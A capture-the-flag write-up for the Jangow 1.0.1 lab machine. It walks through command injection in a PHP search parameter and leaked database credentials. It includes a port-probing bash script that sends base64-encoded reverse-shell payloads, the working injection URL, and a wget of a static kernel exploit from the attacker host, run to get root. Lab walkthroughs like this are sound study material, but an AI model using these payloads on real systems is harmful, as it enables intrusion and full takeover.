# Jangow: 1.0.1
## User flag

```shell
 nmap -p- -n --min-rate 5000 -sS -Pn -vvv -oN allports 192.168.1.38

 PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Interesting no ssh port open so the only way to get in is via reverse shell. Then after fuzzing directories I decided to fuzz the "buscar" parameter for LFI's


  Command line : `ffuf -w /home/dasor/wordlist/LFI-Jhaddix.txt -u http://192.168.1.38/site/busque.php?buscar=FUZZ -v -of md -o ffuf:lfi_search -fs 1`
  Time: 2022-08-20T12:22:23&#43;02:00

  | FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | ResultFile |
  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- |
  | %0a/bin/cat%20/etc/passwd | http://192.168.1.38/site/busque.php?buscar=%0a/bin/cat%20/etc/passwd |  | 7 | 200 | 1679 | 15 | 34 | text/html; charset=UTF-8 |  |
  | passwd | http://192.168.1.38/site/busque.php?buscar=passwd |  | 479 | 200 | 33 | 4 | 3 | text/html; charset=UTF-8 |  |


surprisingly this page is just a direct php RCE so I got the user flag from there.

## Root flag

Now to get root first we need a shell but at the beginning I wasn't able to craft one  no matter what. However looking through the files I found credentials in a hidden file in ../

```
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```

This credential were valid for ftp but I couldn't find anything valuable there. At this point I thought maybe some kind of firewall was blocking my reverse shells So I did a Bash script to check port by port if a connection can be established. I first Tried with the first 1000 ports.


```shell
#!/bin/bash

trap "rm nc.tmp &>/dev/null" EXIT
trap exit 1 INT

id | grep root &>/dev/null
if [ $? != 0 ]
then
	echo "[!] You need root privileges to open this ports"
	exit 1
fi

for i in {1..1000}
do
	payload="sh -i >& /dev/tcp/192.168.1.13/$i 0>&1"
	payload=$(echo $payload  | base64)
	payload="echo \"$payload\""
	payload="$payload | base64 -d | bash"
	payload=$(echo $payload | jq -sRr @uri)
	timeout 1 sudo nc -lvp $i &> nc.tmp &
	timeout 1 curl -s http://192.168.1.38/site/busque.php?buscar=$payload
	echo "[+] trying port $i"
	if [ $(cat nc.tmp | grep -ivE "Terminated|err"| wc -l ) != 0 ]
	then
		echo -e "\t[+] Port found $i"
		exit 0
	fi


done
```

I have to say that this script is not 100% reliable, I think it's because of the timeouts and the more you increase them the more reliable the script is but 1 second for port is already quite slow.

```shell
sudo ./rev_shell_port_check.sh
[+] trying port 437
[+] trying port 438
[+] trying port 439
[+] trying port 440
[+] trying port 441
[+] trying port 442
[+] trying port 443
        [+] Port found 443
```

I guess it makes sense if it blocked port 443 then the computer wouldn't be able to connect to https websites. This situation is quite unusual but surely something we can learn from. Then I just used my base64 encoded rev shell and got in


```
http://192.168.1.38/site/busque.php?buscar=echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEzLzQ0MyAwPiYxCg==%22%20|%20base64%20-d%20|%20bash
```

```shell
sudo nc -lvp 443
[sudo] password for dasor:
Connection from 192.168.1.38:39554
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@jangow01:/var/www/html/site$ ^Z
zsh: suspended  sudo nc -lvp 443
[dasor@archlinux ~/htb/jangow]$ stty raw -echo;fg
[1]  + continued  sudo nc -lvp 443

www-data@jangow01:/var/www/html/site$ stty rows 30 columns 132
www-data@jangow01:/var/www/html/site$ su jangow01
Password:
jangow01@jangow01:/var/www/html/site$
```

Now privilege escalation is really easy, just by looking at the linux version we can see it's really outdated

```shell
jangow01@jangow01:/var/www/html/site$ uname -a
Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

Searching for exploits [this][https://www.exploit-db.com/exploits/45010] comes up. In this case we need to compile the exploit statically because there are no libraries in the victim's machine.

```shell
[dasor@archlinux ~/htb/jangow]$ gcc --static exp2.c -o exploit
[dasor@archlinux ~/htb/jangow]$ ldd exploit
```

Now let's download it from the other machine (also use port 443) and execute it

```shell
[dasor@archlinux ~/htb/jangow]$ sudo python3 -m http.server 443
...
 jangow01@jangow01:~$ wget 192.168.1.13:443/exploit
--2022-08-22 13:22:02--  http://192.168.1.13:443/exploit
Conectando-se a 192.168.1.13:443... conectado.
A requisição HTTP foi enviada, aguardando resposta... 200 OK
Tamanho: 796480 (778K) [application/octet-stream]
Salvando em: “exploit”

exploit                        100%[==========================================================>] 777,81K  --.-KB/s    in 0,002s

2022-08-22 13:22:02 (447 MB/s) - “exploit” salvo [796480/796480]
jangow01@jangow01:~$ chmod u+x exploit
jangow01@jangow01:~$ ./exploit
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003da86900
[*] Leaking sock struct from ffff880037ca3a40
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88003439d9c0
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88003439d9c0
[*] credentials patched, launching shell...
# whoami
root
# cat /root/proof.txt
                       @@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@&&&&&&&&&&&&&&
                       @  @@@@@@@@@@&( .@@@@@@@@&%####((//#&@@@&   .&@@@@@
                       @  @@@@@@@&  @@@@@@&@@@@@&%######%&@*   ./@@*   &@@
                       @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&.   &@@@&&
                       @  @@@, /@@@@@@@@#,                       .@.  ,&,   @@&&
                       @  @&  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&
                       @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@
                       @@&  @@@@@@@@*          @@@@@@@@@@@             ,        @
                       @&  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &@
                      @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@
                      @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@
                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@
                       @&   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@
                       @@    ,@@@@@@@@,   @@@@@@@@@&*%@@@@@@@@@,    @@@@@(%&*   &@
                       @@&     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &@
                       @ @&     ,@@@@@@@@@@@@@@@,@@@@@@@&%@@@@@@@@@@@@@@@%*   &@
                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &@&
                       @  @@@&       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &@@&&
                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&#/.      &@@@@&&
                       @  @@@@@@@@&               JANGOW               &@@@
                       @  &&&&&&&&&@@@&     @@(&@ @. %.@ @@%@     &@@@&&&&
                                     &&&@@@@&%       &/    (&&@@@&&&
                                       (((((((((((((((((((((((((((((


```

And done! pretty easy machine except for the port part that was quite confusing
